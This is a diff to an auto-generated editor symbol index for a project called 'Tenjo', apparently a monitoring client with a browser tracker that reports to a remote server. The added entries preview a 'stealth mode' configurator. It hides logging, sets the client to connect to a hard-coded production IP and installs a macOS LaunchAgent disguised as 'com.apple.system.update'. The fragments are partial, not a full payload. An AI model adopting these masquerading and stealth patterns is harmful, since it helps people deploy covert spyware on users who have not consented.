@@ -173,6 +173,14 @@
         "documentation": {}
     },
     {
+        "label": "datetime",
+        "importPath": "datetime",
+        "description": "datetime",
+        "isExtraImport": true,
+        "detail": "datetime",
+        "documentation": {}
+    },
+    {
         "label": "time",
         "kind": 6,
         "isExtraImport": true,
@@ -580,6 +588,15 @@
         "documentation": {}
     },
     {
+        "label": "shutil",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "shutil",
+        "description": "shutil",
+        "detail": "shutil",
+        "documentation": {}
+    },
+    {
         "label": "BrowserTracker",
         "importPath": "src.modules.browser_tracker",
         "description": "src.modules.browser_tracker",
@@ -742,7 +759,7 @@
         "kind": 6,
         "importPath": "client.src.core.config",
         "description": "client.src.core.config",
-        "peekOfCode": "class Config:\n    # Server Configuration - DEVELOPMENT\n    # SERVER_URL = os.getenv('TENJO_SERVER_URL', \"http://127.0.0.1:8000\")  # Development server\n    SERVER_URL = \"http://127.0.0.1:8000\"\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    API_KEY = os.getenv('TENJO_API_KEY', \"tenjo-api-key-2024\")\n    # Client Identification - Dynamic generation based on hardware\n    @staticmethod\n    def generate_client_id():\n        \"\"\"Generate unique client ID based on hardware\"\"\"",
+        "peekOfCode": "class Config:\n    # Server Configuration - PRODUCTION\n    # SERVER_URL = os.getenv('TENJO_SERVER_URL', \"http://127.0.0.1:8000\")  # Development server\n    # SERVER_URL = \"http://127.0.0.1:8000\"  # Development (disabled)\n    SERVER_URL = os.getenv(\"TENJO_SERVER_URL\", \"http://103.129.149.67\")  # Production server IP\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    API_KEY = os.getenv('TENJO_API_KEY', \"tenjo-api-key-2024\")\n    # Client Identification - Dynamic generation based on hardware\n    @staticmethod\n    def generate_client_id():",
         "detail": "client.src.core.config",
         "documentation": {}
     },
@@ -942,6 +959,87 @@
         "description": "client.diagnostic_tool",
         "peekOfCode": "def main():\n    print(\"🛠️  TENJO DASHBOARD & CLIENT DIAGNOSTIC\")\n    print(\"=\" * 50)\n    print(f\"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\")\n    print()\n    # Run all tests\n    test_dashboard_endpoints()\n    check_client_registration()\n    check_live_clients()\n    test_live_streaming()",
         "detail": "client.diagnostic_tool",
+        "documentation": {}
+    },
+    {
+        "label": "print_status",
+        "kind": 2,
+        "importPath": "client.enable_production_mode",
+        "description": "client.enable_production_mode",
+        "peekOfCode": "def print_status(message):\n    print(f\"[INFO] {message}\")\ndef print_success(message):\n    print(f\"[SUCCESS] {message}\")\ndef print_error(message):\n    print(f\"[ERROR] {message}\")\ndef backup_config():\n    \"\"\"Create backup of current config\"\"\"\n    config_file = \"src/core/config.py\"\n    backup_file = f\"src/core/config.py.backup.{datetime.now().strftime('%Y%m%d_%H%M%S')}\"",
+        "detail": "client.enable_production_mode",
+        "documentation": {}
+    },
+    {
+        "label": "print_success",
+        "kind": 2,
+        "importPath": "client.enable_production_mode",
+        "description": "client.enable_production_mode",
+        "peekOfCode": "def print_success(message):\n    print(f\"[SUCCESS] {message}\")\ndef print_error(message):\n    print(f\"[ERROR] {message}\")\ndef backup_config():\n    \"\"\"Create backup of current config\"\"\"\n    config_file = \"src/core/config.py\"\n    backup_file = f\"src/core/config.py.backup.{datetime.now().strftime('%Y%m%d_%H%M%S')}\"\n    if os.path.exists(config_file):\n        shutil.copy2(config_file, backup_file)",
+        "detail": "client.enable_production_mode",
+        "documentation": {}
+    },
+    {
+        "label": "print_error",
+        "kind": 2,
+        "importPath": "client.enable_production_mode",
+        "description": "client.enable_production_mode",
+        "peekOfCode": "def print_error(message):\n    print(f\"[ERROR] {message}\")\ndef backup_config():\n    \"\"\"Create backup of current config\"\"\"\n    config_file = \"src/core/config.py\"\n    backup_file = f\"src/core/config.py.backup.{datetime.now().strftime('%Y%m%d_%H%M%S')}\"\n    if os.path.exists(config_file):\n        shutil.copy2(config_file, backup_file)\n        print_success(f\"Config backed up to: {backup_file}\")\n        return True",
+        "detail": "client.enable_production_mode",
+        "documentation": {}
+    },
+    {
+        "label": "backup_config",
+        "kind": 2,
+        "importPath": "client.enable_production_mode",
+        "description": "client.enable_production_mode",
+        "peekOfCode": "def backup_config():\n    \"\"\"Create backup of current config\"\"\"\n    config_file = \"src/core/config.py\"\n    backup_file = f\"src/core/config.py.backup.{datetime.now().strftime('%Y%m%d_%H%M%S')}\"\n    if os.path.exists(config_file):\n        shutil.copy2(config_file, backup_file)\n        print_success(f\"Config backed up to: {backup_file}\")\n        return True\n    else:\n        print_error(\"Config file not found\")",
+        "detail": "client.enable_production_mode",
+        "documentation": {}
+    },
+    {
+        "label": "enable_stealth_mode",
+        "kind": 2,
+        "importPath": "client.enable_production_mode",
+        "description": "client.enable_production_mode",
+        "peekOfCode": "def enable_stealth_mode():\n    \"\"\"Enable stealth mode in config.py\"\"\"\n    config_file = \"src/core/config.py\"\n    if not os.path.exists(config_file):\n        print_error(\"Config file not found\")\n        return False\n    # Read current config\n    with open(config_file, 'r') as f:\n        content = f.read()\n    # Production modifications",
+        "detail": "client.enable_production_mode",
+        "documentation": {}
+    },
+    {
+        "label": "create_production_service_configs",
+        "kind": 2,
+        "importPath": "client.enable_production_mode",
+        "description": "client.enable_production_mode",
+        "peekOfCode": "def create_production_service_configs():\n    \"\"\"Create production-ready service configurations\"\"\"\n    # macOS LaunchAgent with stealth settings\n    macos_plist = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>com.apple.system.update</string>\n    <key>ProgramArguments</key>",
+        "detail": "client.enable_production_mode",
+        "documentation": {}
+    },
+    {
+        "label": "update_installers_for_stealth",
+        "kind": 2,
+        "importPath": "client.enable_production_mode",
+        "description": "client.enable_production_mode",
+        "peekOfCode": "def update_installers_for_stealth():\n    \"\"\"Update installer scripts to use stealth configurations\"\"\"\n    installer_files = [\n        \"install_macos_production.sh\",\n        \"install_windows_production.bat\", \n        \"install_linux_production.sh\"\n    ]\n    for installer in installer_files:\n        if os.path.exists(f\"../{installer}\"):\n            print_success(f\"Installer ready: {installer}\")",
+        "detail": "client.enable_production_mode",
+        "documentation": {}
+    },
+    {
+        "label": "verify_stealth_configuration",
+        "kind": 2,
+        "importPath": "client.enable_production_mode",
+        "description": "client.enable_production_mode",
+        "peekOfCode": "def verify_stealth_configuration():\n    \"\"\"Verify stealth mode is properly configured\"\"\"\n    print_status(\"Verifying stealth configuration...\")\n    # Check config.py\n    config_file = \"src/core/config.py\"\n    with open(config_file, 'r') as f:\n        config_content = f.read()\n    checks = [\n        (\"STEALTH_MODE = True\", \"Stealth mode enabled\"),\n        (\"LOG_LEVEL.*ERROR\", \"Error-level logging only\"),",
+        "detail": "client.enable_production_mode",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "client.enable_production_mode",
+        "description": "client.enable_production_mode",
+        "peekOfCode": "def main():\n    print(\"🕵️  TENJO PRODUCTION/STEALTH MODE CONFIGURATOR\")\n    print(\"=\" * 50)\n    # Change to client directory\n    if not os.path.exists(\"src/core/config.py\"):\n        if os.path.exists(\"client/src/core/config.py\"):\n            os.chdir(\"client\")\n        else:\n            print_error(\"Could not find client directory\")\n            sys.exit(1)",
+        "detail": "client.enable_production_mode",
         "documentation": {}
     },
     {
